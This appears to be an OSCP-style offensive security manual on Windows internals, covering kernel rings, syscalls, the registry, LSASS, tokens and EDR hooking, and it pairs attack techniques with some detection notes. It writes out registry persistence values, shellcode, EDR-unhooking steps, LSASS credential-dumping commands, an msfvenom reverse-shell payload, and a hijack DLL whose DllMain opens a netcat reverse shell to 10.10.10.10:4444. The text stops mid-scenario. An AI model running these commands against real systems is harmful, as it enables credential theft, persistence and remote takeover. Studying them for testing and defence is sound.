
# Windows Architecture: The Hacker's Comprehensive Manual

> **Executive Summary**: Windows is not just an OS — it is a battlefield. Every architectural decision Microsoft made (Protection Rings, Token-based security, API layering, the Registry) creates both security features AND exploitable surfaces. This document is your technical bible for understanding Windows from the inside out. We cover kernel internals, memory architecture, the security subsystem, API layers, and real exploitation scenarios. For every component, you get: how it works, how attackers abuse it, and how defenders detect the abuse.

---

## Table of Contents

1. [Introduction & Learning Strategy](#1-introduction)
2. [Protection Rings & Kernel Architecture](#2-protection-rings)
3. [Core Components Deep Dive](#3-core-components)
4. [Windows Registry Deep Dive](#4-registry)
5. [Process and Memory Architecture](#5-process-memory)
6. [Virtual Memory & Address Space Layout](#6-virtual-memory)
7. [Security Architecture — LSA & SRM](#7-security-architecture)
8. [Windows API Layers](#8-api-layers)
9. [Windows Object Manager](#9-object-manager)
10. [Interrupt & Exception Handling](#10-interrupts)
11. [Operational Attack Scenarios](#11-scenarios)
12. [Guided Lab: Investigating Architecture](#12-labs)
13. [ASCII Diagrams & Visuals](#13-diagrams)
14. [Advanced Concepts](#14-advanced)
15. [Interview Questions & Checkpoints](#15-interview)

---

## 1. Introduction & Learning Strategy

**Objective**: This document is not just an overview — it is a deep-dive operational manual into the internal mechanics of the Windows OS. Understanding these internals is the difference between a "script kiddie" running tools and an advanced operator who creates them, customises them, and understands WHY they work.

We dissect the Windows NT Kernel, memory management, process lifecycle, the API hierarchy, and the security subsystem. For every architectural component, we explore:
1. **How it works** (Internals)
2. **How to abuse it** (Offensive Tradecraft)
3. **How to detect abuse** (Defensive Operations)

### Why This Matters for OSCP & Beyond

- **Privilege Escalation**: Requires knowing Token structure and how SCM works.
- **Process Injection**: Requires knowing Virtual Memory and how the Loader works.
- **Persistence**: Requires knowing the Registry, Services, and WMI.
- **Credential Dumping**: Requires knowing how LSASS stores secrets.
- **AV/EDR Evasion**: Requires knowing the API layers and how hooks work.

### Beginner Orientation: What is Windows NT?

```
ABSOLUTE BEGINNER EXPLANATION:
==============================
Think of Windows like a layered cake:

  TOP LAYER:    Your apps (Chrome, Notepad) — they can't touch hardware directly
  MIDDLE LAYER: Windows APIs — the translators between apps and the OS
  BOTTOM LAYER: The Kernel — the actual hardware manager

The kernel is like the bank vault manager:
- Only authorized "tellers" (APIs) can go through the vault
- Regular "customers" (apps) must make requests at the counter
- If a customer sneaks behind the counter = KERNEL EXPLOIT
```

---

## 2. Protection Rings & Kernel Architecture

### 2.1 The CPU Ring Model

Modern CPUs implement privilege rings. Windows uses only two of the four available rings:

```
  CPU Ring Model:
  ┌─────────────────────────────────┐
  │          Ring 3                 │  ← USER MODE
  │    (Applications, Services)     │
  │   ┌─────────────────────────┐   │
  │   │        Ring 2           │   │  ← Not used by Windows
  │   │   ┌─────────────────┐   │   │
  │   │   │     Ring 1      │   │   │  ← Not used by Windows
  │   │   │  ┌───────────┐  │   │   │
  │   │   │  │  Ring 0   │  │   │   │  ← KERNEL MODE
  │   │   │  │ (Kernel)  │  │   │   │
  │   │   │  └───────────┘  │   │   │
  │   │   └─────────────────┘   │   │
  │   └─────────────────────────┘   │
  └─────────────────────────────────┘
```

### 2.2 Ring 0: Kernel Mode (Unlimited Power)

**What runs here:**
- `ntoskrnl.exe` — The kernel itself
- `hal.dll` — Hardware Abstraction Layer
- Device drivers (`*.sys`) — Network cards, storage, etc.
- `win32k.sys` — Window Manager and GDI (graphical device interface)

**Why it matters for attackers:**
- A crash in Ring 0 = BSOD (no recovery)
- Code in Ring 0 can read/write ANY memory address
- Rootkits hide in Ring 0 to be invisible to Ring 3 security tools
- BYOVD (Bring Your Own Vulnerable Driver) attacks load Ring 0 code via signed but vulnerable drivers

**Real Attack Example — BYOVD:**
```
Attack Chain:
1. Find a legitimate, Microsoft-signed driver with a memory write vulnerability
   (e.g., msi_afterburner.sys, capcom.sys, mhyprot2.sys)
2. Load that driver on target (requires Admin, but NOT SYSTEM)
3. Exploit the vulnerability in the driver to write your shellcode into kernel memory
4. Now your code runs as Ring 0 — invisible to most AV/EDR

Tools: PPLKiller, kdmapper, TDLLoadDriver
```

### 2.3 Ring 3: User Mode (Restricted)

**What runs here:**
- All user applications (Notepad, Chrome, Malware)
- Windows services (`svchost.exe`)
- Subsystem processes (`csrss.exe`, `lsass.exe`)

**Constraints:**
- Cannot access physical memory directly
- Cannot execute privileged CPU instructions
- Cannot see other processes' memory (Virtual Address Space isolation)
- Any crash only kills that process, not the OS

### 2.4 The System Call: Crossing the Bridge

When a Ring 3 application needs to do anything useful (read a file, open a socket, create a process), it must ask Ring 0 via a **system call**.

```
SYSTEM CALL JOURNEY (x64 Windows):

App (ring3)        ntdll.dll          Kernel (ring0)
    │                  │                   │
    │  CreateFile()    │                   │
    ├─────────────────►│                   │
    │                  │ NtCreateFile()    │
    │                  ├──────────────────►│
    │                  │  mov eax, 0x55    │ ← SSN (System Service Number)
    │                  │  syscall          │ ← CPU switches to Ring 0
    │                  │                   │  Kernel looks up SSDT[0x55]
    │                  │                   │  Executes NtCreateFile
    │                  │◄──────────────────┤
    │◄─────────────────┤  Return Handle    │
    │                  │                   │
```

**Red Team Implication — Direct Syscalls:**
AV/EDR hooks user-mode functions in `ntdll.dll`. If your malware calls `NtCreateFile` through the normal chain, the hook fires. If your malware uses **direct syscalls** (manually invoking the `syscall` instruction with the right SSN), it completely bypasses user-mode hooks.

```asm
; Direct syscall example (x64 ASM)
; Skip ntdll, go directly to kernel
NtOpenProcess_direct:
    mov r10, rcx          ; Required by syscall ABI
    mov eax, 0x26         ; SSN for NtOpenProcess (varies by Windows build)
    syscall               ; CPU → Ring 0, bypasses all NTDLL hooks
    ret
```

Tools that implement direct syscalls: `SysWhispers2`, `Hell's Gate`, `Halo's Gate`

### 2.5 The SSDT (System Service Descriptor Table)

The SSDT is a kernel-mode table mapping SSNs to kernel function addresses.

```
SSDT (Kernel Memory):
┌─────┬────────────────────────────┐
│ SSN │ Function Pointer           │
├─────┼────────────────────────────┤
│  0  │ NtAccessCheck              │
│  1  │ NtWorkerFactoryWorkerReady │
│ ... │ ...                        │
│0x26 │ NtOpenProcess              │
│0x55 │ NtCreateFile               │
│ ... │ ...                        │
└─────┴────────────────────────────┘
```

**PatchGuard** (KPP — Kernel Patch Protection) monitors the SSDT. If a rootkit modifies an entry to redirect to its own code, PatchGuard triggers a BSOD (Bug Check `0x109`).

---

## 3. Core Components Deep Dive

### 3.1 HAL — Hardware Abstraction Layer (`hal.dll`)

The HAL is a thin shim between the kernel and physical hardware. It abstracts:
- Timer management
- Interrupt routing
- I/O port access
- DMA (Direct Memory Access)

**Why it exists:** The same kernel binary runs on different motherboards, chipsets, and NUMA topologies because the HAL handles the differences.

**Attacker relevance:** Advanced malware (bootkits) that need to interact with specific hardware must either go through HAL or bypass it with a driver. Firmware-level implants (e.g., UEFI rootkits) operate BELOW the HAL.

### 3.2 The Executive (`ntoskrnl.exe`)

The Executive is the upper layer of the kernel. It provides:

| Subsystem            | Purpose                                           |
|----------------------|---------------------------------------------------|
| **I/O Manager**      | Routes file/device requests to correct drivers    |
| **Object Manager**   | Creates/tracks all kernel objects (files, procs)  |
| **Process Manager**  | Creates/terminates processes and threads          |
| **Memory Manager**   | Virtual memory, paging, working sets              |
| **Security Reference Monitor** | Enforces ACL-based access control      |
| **Cache Manager**    | File system cache for performance                 |
| **Plug and Play Mgr**| Device detection and driver loading               |
| **Power Manager**    | Sleep/hibernate/wake state management             |

### 3.3 The Microkernel

The true "microkernel" portion of `ntoskrnl.exe` handles only:
- Thread scheduling (which thread runs on which CPU core)
- Interrupt dispatching
- Multiprocessor synchronization (spinlocks, DPCs)

This is why Windows is called "hybrid" — the microkernel is tiny, but the Executive (which is much larger) runs in Ring 0 too.

### 3.4 Win32k.sys — The Hidden Attack Surface

`win32k.sys` is the kernel-mode half of the Windows GUI subsystem. It handles:
- Window management (creating, moving, painting windows)
- GDI (Graphics Device Interface) drawing functions

**Security History:** `win32k.sys` has historically had more CVEs than almost any other Windows component. Every GUI function call (creating a window, setting text, etc.) is a potential attack surface because it crosses the Ring 3→Ring 0 boundary.

Famous exploits: CVE-2021-1732, CVE-2020-0041, CVE-2016-7255 — all in win32k.sys.

---

## 4. Windows Registry Deep Dive

### 4.1 Registry Architecture

The Registry is a hierarchical database. Physically, it's stored as "hive" files on disk, loaded into memory at boot.

```
REGISTRY TREE (Logical):
HKEY_LOCAL_MACHINE (HKLM)
├── HARDWARE\      ← Volatile: built at boot, not on disk
├── SAM\           ← Security Account Manager (local accounts)
├── SECURITY\      ← Security policies, cached credentials
├── SOFTWARE\      ← Installed applications, settings
└── SYSTEM\        ← Boot config, services, device drivers

HKEY_CURRENT_USER (HKCU)
└── [User-specific settings, loaded from NTUSER.DAT]

HKEY_CLASSES_ROOT (HKCR)
└── [COM class registrations, file associations — merge of HKLM\SOFTWARE\Classes + HKCU\Software\Classes]

HKEY_USERS (HKU)
└── [All loaded user hive files]
```

### 4.2 Physical Hive Files

| Registry Key   | Physical File Path                                  |
|----------------|-----------------------------------------------------|
| HKLM\SAM       | `C:\Windows\System32\config\SAM`                    |
| HKLM\SECURITY  | `C:\Windows\System32\config\SECURITY`               |
| HKLM\SOFTWARE  | `C:\Windows\System32\config\SOFTWARE`               |
| HKLM\SYSTEM    | `C:\Windows\System32\config\SYSTEM`                 |
| HKCU           | `C:\Users\<username>\NTUSER.DAT`                    |
| UsrClass       | `C:\Users\<username>\AppData\Local\Microsoft\Windows\UsrClass.dat` |

### 4.3 Persistence via Registry — Every Location

**Standard (Detected by every AV):**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

**Advanced — Less monitored:**
```
# Winlogon — Runs during login as SYSTEM context
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\
  Userinit = "C:\windows\system32\userinit.exe,"
  Shell    = "explorer.exe"
  # Attack: append to Userinit: "userinit.exe,C:\malware.exe"

# Image File Execution Options — Debugger Hijacking
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<target.exe>
  Debugger = "C:\malware.exe"
  # Attack: Set Debugger for taskmgr.exe → your shell runs when user opens Task Manager

# AppInit_DLLs — Loads DLL into every GUI process (disabled in Secure Boot environments)
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
  AppInit_DLLs = "C:\evil.dll"
  LoadAppInit_DLLs = 1

# COM Hijacking — per-user COM object redirection
HKCU\Software\Classes\CLSID\{GUID}\InprocServer32
  Default = "C:\evil.dll"
  # HKCU wins over HKLM — no Admin needed!

# BootExecute — Runs BEFORE Windows fully loads (Native API only)
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager
  BootExecute = "autocheck autochk *"

# LSA — DLL loading into LSASS
HKLM\SYSTEM\CurrentControlSet\Control\Lsa
  Security Packages = [list of SSPs]
  # Rogue SSP loaded here dumps all credentials as they authenticate
```

### 4.4 Registry as Attack Artifact

When hunting persistence, check these locations with:
```powershell
# Autoruns equivalent using PowerShell
$runKeys = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
    "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
)

foreach ($key in $runKeys) {
    Write-Host "=== $key ===" -ForegroundColor Yellow
    try { Get-ItemProperty $key } catch {}
}
```

---

## 5. Process and Memory Architecture

### 5.1 Process vs. Thread — The Distinction

```
BEGINNER ANALOGY:
=================
PROCESS = A restaurant
  - Has its own building (address space)
  - Has its own kitchen (resources: handles, tokens)
  - Has its own menu and rules (ACL, integrity level)
  - But without COOKS, nothing happens

THREAD = A cook
  - Threads are what actually EXECUTE code
  - One process can have many threads
  - All threads in a process share the same address space
  - Each thread has its own stack and CPU register state
```

**Process Data Structure (`EPROCESS` in kernel):**
```
EPROCESS (Simplified):
┌──────────────────────────────────────────┐
│ UniqueProcessId        (PID)             │
│ ActiveProcessLinks     (doubly-linked)   │ ← Rootkits unlink this to hide!
│ Token                  (security context)│ ← Privilege escalation target
│ Peb                    (user-mode data)  │
│ ImageFileName          ("explorer.exe")  │
│ InheritedFromPid       (parent PID)      │
│ CreateTime                               │
│ VadRoot                (memory layout)   │
│ ObjectTable            (handle table)    │
│ ThreadListHead         (all threads)     │
└──────────────────────────────────────────┘
```

### 5.2 Process Inheritance Rules

When a process is created, it inherits from the parent:
- **Handles** (if flagged `bInheritHandle = TRUE`)
- **Environment variables**
- **Current working directory**

**Attack: Handle Inheritance Abuse**
```
Scenario:
1. SYSTEM process opens a privileged handle with INHERIT flag
2. SYSTEM process spawns a child (e.g., your malicious DLL gets loaded)
3. Child inherits the privileged handle
4. Child can use that handle (e.g., to write to a protected file) 
   WITHOUT having the privileges itself

Detection: Look for processes with handles they shouldn't have
Tool: Process Explorer → Properties → Handles tab
```

### 5.3 The PEB (Process Environment Block)

The PEB is a user-mode data structure maintained by the OS for each process. It contains critical information.

```
PEB Structure (Key Fields):
┌─────────────────────────────────────────────────┐
│ BeingDebugged       (BYTE)  ← Anti-debug check  │
│ ImageBaseAddress    (PVOID) ← Where .exe loaded  │
│ Ldr                 (→ PEB_LDR_DATA)             │
│   InLoadOrderModuleList  ← List of loaded DLLs  │
│   InMemoryOrderModuleList                        │
│ ProcessParameters   (→ RTL_USER_PROCESS_PARAMS)  │
│   CommandLine                                    │
│   CurrentDirectory                               │
│   Environment                                    │
│ NtGlobalFlag        ← Heap flags set by debugger │
│ SessionId                                        │
└─────────────────────────────────────────────────┘
```

**Attacker Uses of the PEB:**
1. **Walking the PEB** — Shellcode finds `kernel32.dll` base address without API calls:
```asm
; x64 shellcode technique
; GS:[0x60] = PEB address
mov rax, gs:[0x60]         ; PEB
mov rax, [rax + 0x18]      ; PEB.Ldr
mov rax, [rax + 0x20]      ; InMemoryOrderModuleList.Flink (first entry = exe itself)
mov rax, [rax + 0x20]      ; Second entry = ntdll.dll
mov rax, [rax + 0x20]      ; Third entry = kernel32.dll
mov rax, [rax - 0x10 + 0x20] ; Get DllBase from LDR_DATA_TABLE_ENTRY
; rax now = kernel32.dll base address — no API called!
```

2. **Anti-Debug Evasion** — Checking `BeingDebugged` byte:
```csharp
// Malware checks if being analyzed
bool debugged = Marshal.ReadByte(Process.GetCurrentProcess().MainModule.BaseAddress, 2) != 0;
// More reliable check:
bool debugged2 = (bool)typeof(Debugger).GetMethod("IsAttached", 
    BindingFlags.Static|BindingFlags.Public).Invoke(null, null);
```

---

## 6. Virtual Memory & Address Space Layout

### 6.1 Address Space Segmentation

Every process gets its own **Virtual Address Space (VAS)**. On x64 Windows:

```
x64 Process Virtual Address Space:
┌──────────────────────────┐ 0xFFFFFFFFFFFFFFFF
│   Kernel Space           │ ← Ring 0 only (top 128TB)
│   (ntoskrnl, drivers)    │
├──────────────────────────┤ 0xFFFF800000000000
│                          │
│   [Canonical Hole]       │ ← Invalid addresses (hardware enforced)
│                          │
├──────────────────────────┤ 0x00007FFFFFFFFFFF
│   User Space             │ ← Ring 3 accessible (bottom 128TB)
│   (your process)         │
│                          │
│   Stack     ↓            │ ← Grows downward, smaller
│   ...                    │
│   Heap      ↑            │ ← Grows upward
│   ...                    │
│   Loaded DLLs            │ ← ntdll, kernel32, etc.
│   ...                    │
│   Executable (.exe)      │ ← Loaded at 0x0000000140000000 (default)
└──────────────────────────┘ 0x0000000000000000
```

### 6.2 Memory Protection Constants

When allocating memory, you specify protection:

| Constant            | Hex    | Permissions     | Red Team Meaning                     |
|---------------------|--------|-----------------|--------------------------------------|
| `PAGE_READONLY`     | 0x02   | R               | Normal data/code mapping             |
| `PAGE_READWRITE`    | 0x04   | RW              | Normal heap/data                     |
| `PAGE_EXECUTE`      | 0x10   | X               | Unusual — no read needed?            |
| `PAGE_EXECUTE_READ` | 0x20   | RX              | Normal code (most legitimate code)   |
| `PAGE_EXECUTE_READWRITE` | 0x40 | RWX          | **RED FLAG** — shellcode staging     |
| `PAGE_NOACCESS`     | 0x01   | None            | Guard pages                          |

**Detection Logic:**
```powershell
# Hunt for RWX memory regions (shellcode indicator)
# Using Get-InjectedThread or similar tools:
$processes = Get-Process
foreach ($proc in $processes) {
    # Real tools use VirtualQueryEx to enumerate memory regions
    # Looking for EXECUTE_READWRITE (0x40) in unexpected processes
    Write-Host "Checking $($proc.Name) (PID: $($proc.Id))"
}
```

### 6.3 ASLR (Address Space Layout Randomization)

ASLR randomizes where DLLs, the stack, and heap are loaded in memory. This breaks exploit techniques that rely on hardcoded return addresses.

```
Without ASLR (predictable):
  kernel32.dll always at: 0x77000000
  ntdll.dll always at:    0x77F00000
  Stack always starts at: 0x0012FFFF

With ASLR (randomized each boot):
  kernel32.dll at: 0x7FF8B1A40000  (random)
  ntdll.dll at:    0x7FF8C2D10000  (random)
  Stack starts at: 0x0006FFEF...   (random)
```

**ASLR Bypass Techniques:**
1. **Info Leak Vulnerabilities** — Find a bug that reveals a pointer → calculate base address
2. **Non-ASLR Modules** — If ANY loaded DLL doesn't have ASLR (`/DYNAMICBASE` flag missing), use it as a ROP gadget source
3. **Heap Spray** — Flood large memory regions, statistics-based (works against 32-bit ASLR which has few bits of entropy)
4. **JIT Spray** — Use JIT-compiled code (Flash, JScript, .NET) which creates predictable gadgets

### 6.4 DEP (Data Execution Prevention) / NX

DEP marks memory pages as non-executable:
- Heap → Non-executable
- Stack → Non-executable  
- Data sections → Non-executable
- Only `.text` (code) sections are executable

**Bypass — ROP (Return-Oriented Programming):**
```
Instead of injecting new shellcode (which DEP blocks),
chain together EXISTING executable code snippets ("gadgets"):

Gadget 1 (from ntdll.dll):  pop rdi; ret
Gadget 2 (from kernel32):   mov [rdi], rsi; ret
Gadget 3 (from ntoskrnl):   call VirtualProtect; ret

By chaining gadgets, you can:
1. Call VirtualProtect() to make a memory page executable
2. Then jump to your shellcode in that now-executable page
```

---

## 7. Security Architecture — LSA & SRM

### 7.1 LSASS — The Crown Jewel

`lsass.exe` (Local Security Authority Subsystem Service) is the most important process for authentication and the most targeted process for credential theft.

```
LSASS Responsibilities:
┌──────────────────────────────────────────────────────────┐
│  lsass.exe                                               │
│                                                          │
│  ┌─────────────────┐  ┌─────────────────────────────┐   │
│  │ Authentication  │  │ Credential Storage          │   │
│  │ Packages        │  │                             │   │
│  │ - msv1_0.dll    │  │ - NT Hashes (NTLM auth)     │   │
│  │   (NTLM)        │  │ - Kerberos Tickets (TGT)    │   │
│  │ - kerberos.dll  │  │ - WDigest cleartext (legacy)│   │
│  │   (Kerberos)    │  │ - DPAPI Master Keys         │   │
│  │ - wdigest.dll   │  │ - Cached Domain Credentials │   │
│  │   (WDigest)     │  └─────────────────────────────┘   │
│  └─────────────────┘                                     │
│                                                          │
│  ┌─────────────────┐  ┌─────────────────────────────┐   │
│  │ Token Creation  │  │ Policy Enforcement          │   │
│  │ (on logon)      │  │ (password complexity, etc.) │   │
│  └─────────────────┘  └─────────────────────────────┘   │
└──────────────────────────────────────────────────────────┘
```

### 7.2 Credential Storage in LSASS Memory

When you log in:
1. Your credentials are verified
2. Copies of them (in various forms) are kept in LSASS memory for **Single Sign-On**

This is why Mimikatz works — it reads LSASS process memory:

```
LSASS Memory Layout (simplified):
┌──────────────────────────────────┐
│ msv1_0.dll section:              │
│   Username: CORP\jdoe            │
│   NT Hash:  <MD4 of password>    │ ← Pass-the-Hash
│                                  │
│ kerberos.dll section:            │
│   Username: CORP\jdoe            │
│   TGT:      <encrypted blob>     │ ← Pass-the-Ticket
│   Session Key: <AES key>         │
│                                  │
│ wdigest.dll section (if enabled):│
│   Username: CORP\jdoe            │
│   Password: P@ssw0rd!            │ ← Cleartext! (Win XP era)
└──────────────────────────────────┘
```

**Credential Dumping Methods:**

| Method | Command | Requires | Stealth |
|--------|---------|----------|---------|
| Mimikatz sekurlsa | `sekurlsa::logonpasswords` | SeDebugPrivilege | Low |
| MiniDump via Task Manager | Right-click lsass → Create Dump | Admin | Medium |
| MiniDump via comsvcs.dll | `rundll32 comsvcs.dll,MiniDump <PID> lsass.dmp full` | Admin | Medium |
| Procdump (Sysinternals) | `procdump -ma lsass.exe lsass.dmp` | Admin | Medium |
| Shadow Copy + ntdsutil | `ntdsutil snapshot` | Domain Admin | High |
| DCSync (remote) | `lsadump::dcsync /user:krbtgt` | Domain Admin | High |

### 7.3 PPL — Protected Process Light

Microsoft added PPL (Protected Process Light) to prevent unauthorized access to LSASS:

```
Without PPL:
  Any process with SeDebugPrivilege can OpenProcess(LSASS) and ReadProcessMemory

With PPL (RunAsPPL = 1):
  Even SeDebugPrivilege is not enough
  Only PPL-level processes can open LSASS
  Mimikatz fails with "Access Denied"
```

**Check PPL status:**
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

**PPL Bypass Methods:**
1. **Kernel Driver** — Load a vulnerable/malicious driver to modify the `EPROCESS.SignatureLevel` byte from Ring 0
2. **Remove PPL** — If Admin, set `RunAsPPL = 0` and reboot
3. **PPLBlade / PPLKiller** — Tools that automate driver-based PPL bypass

### 7.4 Access Token Architecture

Every process and thread has an **Access Token** — its security "ID card":

```
Access Token:
┌──────────────────────────────────────────────┐
│ Header                                        │
│   TokenType     (Primary or Impersonation)   │
│   ImpersonationLevel (Anonymous → Delegate)  │
├──────────────────────────────────────────────┤
│ User SID        S-1-5-21-<domain>-1001       │
│ Primary Group   S-1-5-21-<domain>-513        │
├──────────────────────────────────────────────┤
│ Group SIDs (up to 1024):                     │
│   S-1-5-21-<domain>-512  (Domain Admins)     │
│   S-1-1-0                (Everyone)          │
│   S-1-5-11               (Authenticated Users│
├──────────────────────────────────────────────┤
│ Privileges:                                  │
│   SeDebugPrivilege        [Enabled]          │
│   SeImpersonatePrivilege  [Enabled]          │
│   SeBackupPrivilege       [Disabled]         │
│   SeShutdownPrivilege     [Disabled]         │
├──────────────────────────────────────────────┤
│ Integrity Level   (High / 0x3000)            │
│ Session ID                                   │
│ Token Source      (NtLmSsp / Kerberos)       │
└──────────────────────────────────────────────┘
```

**Why Integrity Level Matters:**
```
Integrity Levels (Low to High):
  0x0000  Untrusted     ← Sandboxed, almost no rights
  0x1000  Low           ← Internet Explorer, sandboxed apps
  0x2000  Medium        ← Standard user (Default for logged-in user)
  0x3000  High          ← Admin with UAC elevated
  0x4000  System        ← SYSTEM account
  0x5000  Protected     ← PPL processes

Rule: A process CANNOT write to objects with higher integrity
      (even if the DACL allows it) — this is "UIPI"
```

---

## 8. Windows API Layers

### 8.1 The Full API Stack

```
USER APPLICATION
      │
      ▼
Win32 API (kernel32.dll, advapi32.dll, user32.dll, ws2_32.dll)
  - "CreateFile", "RegOpenKey", "CreateProcess"
  - This is what developers use
  - AV/EDR HOOKS MOSTLY HERE
      │
      ▼
Native API (ntdll.dll)
  - "NtCreateFile", "NtOpenKey", "NtCreateProcess"
  - "Nt" prefix = goes to kernel, "Ldr" prefix = loader functions
  - EDR may also hook here (kernel callbacks preferred now)
      │
      ▼
SYSCALL INSTRUCTION (CPU crosses Ring 3 → Ring 0)
      │
      ▼
Kernel Executive (ntoskrnl.exe)
  - "ZwCreateFile" (same as Nt* but with extra validation)
  - EDR kernel callbacks fire here (PsSetCreateProcessNotifyRoutine, etc.)
      │
      ▼
Kernel Driver (if needed: filesystem driver, network driver)
      │
      ▼
HARDWARE
```

### 8.2 AV/EDR Hooking Explained

Modern AV/EDR products inject a DLL into every process and hook sensitive functions:

```
BEFORE hooking (normal ntdll.dll):
NtOpenProcess:
  4C 8B D1     mov r10, rcx
  B8 26 00 00  mov eax, 0x26
  0F 05        syscall
  C3           ret

AFTER EDR hooks NtOpenProcess:
NtOpenProcess:
  E9 XX XX XX XX   jmp 0xEdR_hook_function  ← EDR replaced first 5 bytes!
  00 00            (rest of original bytes)

EDR hook function:
  - Logs the call (who called, with what args)
  - Checks if it looks malicious
  - If OK: restores original bytes, calls original
  - If bad: blocks and alerts
```

**Unhooking Techniques:**
```csharp
// Method 1: Read ntdll.dll FRESH from disk (before EDR hooked it)
// Load a clean copy of ntdll.dll from C:\Windows\System32\ntdll.dll
// Map it into memory, overwrite the hooked functions with clean bytes

// Method 2: Overwrite hooked function with original bytes
// Read original bytes from ntdll.dll on disk
// VirtualProtect to make function writeable
// Write original bytes back

// Method 3: Use Direct Syscalls (bypass ntdll entirely)
// Generate SSNs by sorting Zw* exports from ntdll alphabetically
// Use assembly trampoline to call syscall directly
```

---

## 9. Windows Object Manager

### 9.1 Everything is an Object

In Windows NT, every "thing" the OS manages is an **Object**. This includes:

| Object Type   | Examples                                           |
|---------------|---------------------------------------------------|
| Process       | `EPROCESS` structures                             |
| Thread        | `ETHREAD` structures                              |
| File          | Open file handles                                 |
| Registry Key  | Open registry handles                             |
| Event         | Synchronization events (`CreateEvent`)            |
| Mutex         | Mutually exclusive locks (`CreateMutex`)          |
| Section       | Shared memory mappings                            |
| Token         | Security access tokens                            |
| Semaphore     | Counting semaphores                               |
| Desktop       | GUI desktop objects                               |
| Window Station| Window station objects                            |

### 9.2 Named Objects (Global Namespace)

Objects can be named so other processes can find them:

```
Object Namespace:
\BaseNamedObjects\     ← User-mode accessible named objects
  \Global\             ← Global scope (cross-session)
  \Local\              ← Per-session (default)
  
\Device\               ← Kernel device objects
  \HarddiskVolume1     ← Physical disk 1
  \NamedPipe\          ← Named pipe objects
  
\KernelObjects\        ← Kernel-created objects
  \LowCommitCondition  ← Low memory condition event
```

**Attacker Use of Named Objects — Mutex Beaconing:**
```csharp
// Malware creates a named mutex to avoid running multiple instances
// Defenders check for unusual mutex names as IOCs

// Create mutex
Mutex m = new Mutex(false, "Global\\{1234ABCD-SOME-GUID-HERE}");

// Defenders: Use Autoruns or WinObjEx64 to list all named mutexes
// Malware fingerprinting by mutex name is common in threat intel
```

### 9.3 Handle Tables

Each process has a **Handle Table** — a private table mapping handle numbers (integers) to kernel object pointers:

```
Process Handle Table:
┌────────┬───────────────────────────────┬──────────────┐
│ Handle │ Kernel Object Pointer         │ Access Mask  │
├────────┼───────────────────────────────┼──────────────┤
│  0x4   │ → EPROCESS (current process)  │ 0x001FFFFF   │
│  0x8   │ → ETHREAD (current thread)    │ 0x001FFFFF   │
│  0x10  │ → File object (C:\temp.txt)   │ 0x80100080   │
│  0x14  │ → Event object                │ 0x001F0003   │
└────────┴───────────────────────────────┴──────────────┘

Handle values are always multiples of 4 (2 low bits reserved for flags)
```

---

## 10. Interrupt & Exception Handling

### 10.1 Interrupts vs. Exceptions

| Type           | Cause                    | Example                         |
|----------------|--------------------------|---------------------------------|
| **Interrupt**  | External hardware event  | Keyboard press, network packet  |
| **Exception**  | CPU error/fault          | Division by zero, null deref    |
| **Trap**       | Deliberate CPU event     | `INT 3` (debug breakpoint)      |
| **Syscall**    | Deliberate ring change   | `syscall` instruction           |

### 10.2 The IDT (Interrupt Descriptor Table)

The CPU uses the IDT to find the handler for each interrupt/exception:

```
IDT (per-CPU, in kernel memory):
┌──────┬────────────────────────────────┐
│ Int# │ Handler Function               │
├──────┼────────────────────────────────┤
│  0x0 │ KiDivideErrorFault             │ ← Division by zero
│  0x1 │ KiDebugTrapOrFault             │ ← Single-step debug
│  0x3 │ KiBreakpointTrap               │ ← INT 3 debugger break
│  0xE │ KiPageFault                    │ ← Page not present
│  ... │ ...                            │
│  0x2E│ KiSystemService                │ ← Old syscall (int 0x2E)
└──────┴────────────────────────────────┘
```

**Attacker Use — INT 3 for Anti-Debug:**
```csharp
// Malware checks if debugger changed INT 3 behavior
[DllImport("kernel32.dll")]
static extern bool IsDebuggerPresent();

// Or manual check via IDT manipulation detection
// If INT 3 doesn't actually break (no debugger), malware runs
// If it does break, malware exits
```

---

## 11. Operational Attack Scenarios

### Scenario A: Unquoted Service Path Exploitation

```
The Setup:
  Service binary path (unquoted):
  C:\Program Files\My Company\App Files\service.exe

Windows Token Parsing:
  Attempt 1: C:\Program.exe              ← Attacker places malware here
  Attempt 2: C:\Program Files\My.exe     ← If writable
  Attempt 3: C:\Program Files\My Company\App.exe
  Attempt 4: C:\Program Files\My Company\App Files\service.exe ← Real binary

Attack Steps:
  1. Find unquoted paths: wmic service get name,displayname,pathname,startmode
     (or PowerUp.ps1: Get-ServiceUnquoted)
  2. Verify write access to parent folder: icacls "C:\Program Files\"
  3. Create malicious executable:
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=... -f exe > "C:\Program.exe"
  4. Restart the service or wait for reboot
  5. Receive SYSTEM shell

Detection:
  Unusual processes spawning from svchost.exe parent paths
  Binary in non-standard location with SYSTEM token
  PowerShell: Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045}
```

### Scenario B: DLL Search Order Hijacking

```
The Setup:
  App: C:\Program Files\VulnApp\vuln.exe
  vuln.exe imports: version.dll (without full path)

DLL Search Order:
  1. C:\Program Files\VulnApp\version.dll   ← Attacker places DLL here!
  2. C:\Windows\System32\version.dll        (real one)
  3. C:\Windows\System\version.dll
  4. C:\Windows\version.dll
  5. Current Directory
  6. PATH entries

Attack Steps:
  1. Identify DLLs loaded by target app using ProcMon:
     Filter: Process Name = vuln.exe AND Result = NAME NOT FOUND AND Path ENDS WITH .dll
  2. Find writeable app directory (icacls)
  3. Create malicious DLL:

// evil_version.cpp
#include <windows.h>
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpvReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        // Spawn reverse shell
        system("C:\\temp\\nc.exe 10.10.10.10 4444 -e cmd.exe");
    }
    return TRUE;
}

  4. Compile: x86_64-w64-mingw32-gcc -shared -o version.dll evil_version.cpp
